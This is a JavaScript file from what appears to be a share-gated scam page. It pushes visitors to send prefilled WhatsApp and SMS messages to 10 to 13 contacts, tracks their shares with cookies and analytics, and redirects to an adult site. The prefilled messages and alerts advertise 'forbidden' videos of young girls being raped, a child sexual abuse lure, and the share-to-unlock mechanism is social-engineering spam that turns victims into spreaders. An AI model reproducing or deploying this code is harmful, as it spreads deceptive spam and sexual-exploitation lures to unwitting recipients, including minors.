﻿var c = getCookie( 'c' ),
		n = 300,
		date = new Date(),
		time = date.getDate() + "/" + ( date.getMonth() + 1 )  + "/" + date.getFullYear() + " " + date.getHours() + ":" + date.getMinutes() + ":" + date.getSeconds(),
		rand = Math.floor( ( Math.random() * 10 ) + 1 ),
		rand2 = Math.floor( ( Math.random() * 100 ) + 1 ),
	//	url = "http://" + rand2 + ".po5.co/emoticon/?" + rand,
	    url = "",
		text = [ url ], // random WhatsApp/sms text
		t = setInterval( function() {
			
			$( "#countdown" ).text( n-- ), -1 == n && window.open( "https://videos-sexyteen.com/seenow", "_self" ) & clearInterval( t )
			
		}, 1e3 );

if ( c >= 13 ) {
	
	$( "#ask" ).hide();
	$( ".choose" ).hide();
	$( ".continue" ).hide();
	$( ".content" ).show();
	
} else if ( c != '' && c != null ) {
	
	$( "#ask" ).hide();
	$( ".choose" ).hide();
	$( ".continue" ).show();
	
} else {
	
	c = 0;
	
}

sharesLeft( c );

function fn1() {
	
	if ( /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test( navigator.userAgent ) ) {
		
	//window.open( "whatsapp://send?text=Novos emoticons animados do Whatsapp :P %0D%0A 👉 " + text[ Math.floor( Math.random() * text.length ) ] + " %0D%0A %0D%0A %0D%0A %0D%0A %0D%0A" + time, "_self" ); 

	window.open( "whatsapp://send?text=🔥 _*Prohibited videos of young girls being raped!*_  %0D%0A %0D%0A😱 _*Just leaked on WhatsApp*_  %0D%0A %0D%0A⚠ ~*It will be deleted shortly*~  %0D%0A %0D%0A🔞 _*ACCESS NOW IF STILL AVAILABLE!*_  %0D%0A👉 https://videos-sexyteen.com" + text[ Math.floor( Math.random() * text.length ) ], "_self" );
		
		c++;
		
		ga( 'send', 'event', 'WhatsApp', '[' + c + '][PT] Emoticon' );
		
		setCookie( 'c', c, 2 ); // set cookie for 2 days
		
		showContent( c );
		
	} else {
		
		window.alert( 'You must invite via mobile.' );
		
	}
	
}

function fn2() {
	
	ga( 'send', 'event', 'WhatsApp', '[' + c + '][PT] Emoticon' );
	
	// window.location.replace( 'https://videos-sexyteen.com/seenow' );
	window.alert("To release forbidden videos of young girls fucking you need to share with 10 friends. \ N \ n So far you only invited " + c + " contacts.");
	
}

function fn3() {
	
	if ( /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test( navigator.userAgent ) ) {
		
		window.open( "sms:?body=See the forbidden videos of young girls fucking a lot! :P %0D%0A " + text[ Math.floor( Math.random() * text.length ) ] + " %0D%0A %0D%0A %0D%0A %0D%0A %0D%0A" + time, "_self" );
		
		c++;
		
		ga( 'send', 'event', 'sms', '[' + c + '][PT] Emoticon' );
		
		setCookie( 'c', c, 2 ); // set cookie for 2 days
		
		showContent( c );
		
	} else {
		
		window.alert( 'You must invite via mobile.' );
		
	}
	
}

function showContent( c ) {
	
	if ( c < 13 ) {
		
		$( "#ask" ).hide();
		$( ".choose" ).hide();
		$( ".continue" ).show();
		
	}
	
	setTimeout( function() {
		
		if ( c >= 13 ) {
			
			$( ".continue" ).hide();
			$( ".content" ).show();
			
		}
		
		sharesLeft( c );
		
	}, 5000 );
	
}

function go() {
	
	ga( 'send', 'event', 'WhatsApp', 'complete [PT] emoticon' );
	
	window.location.replace( 'https://videos-sexyteen.com/seenow' );
	
}

function sharesLeft( c ) {
	
	if ( c > 13 ) {
		
		$( "#shares" ).text( 0 );
		
	} else {
		
		$( "#shares" ).text( 13 - c );
		
	}
	
}

function setCookie( cname, cvalue, exdays ) {
	
	var d = new Date();
	d.setTime( d.getTime() + ( exdays * 24 * 60 * 60 * 1000 ) );
	var expires = 'expires=' + d.toGMTString();
	document.cookie = cname + '=' + cvalue + '; ' + expires;
	
}

function getCookie( cname ) {
	
	var name = cname + '=';
	var ca = document.cookie.split( ';' );
	for ( var i = 0; i < ca.length; i++ ) {
		
		var c = ca[ i ];
		while ( c.charAt( 0 ) == ' ' ) c = c.substring( 1 );
		
		if ( c.indexOf( name ) == 0 ) {
			
			return c.substring( name.length, c.length );
			
		}
		
	}
	
	return '';
	
}

$( document ).ready( function() {
	
	function shakeme1() {
		
		$( ".smile1" ).addClass( "shakeme" );
		
	}
	
	function shakeme2() {
		
		$( ".smile2" ).addClass( "shakeme" );
		
	}
	
	function shakeme3() {
		
		$( ".smile3" ).addClass( "shakeme" );
		
	}
	
	function shakeme4() {
		
		$( ".smile4" ).addClass( "shakeme" );
		
	}
	
	setTimeout( shakeme1, 1000 );
	setTimeout( shakeme2, 1500 );
	setTimeout( shakeme3, 2000 );
	setTimeout( shakeme4, 2500 );
	
} );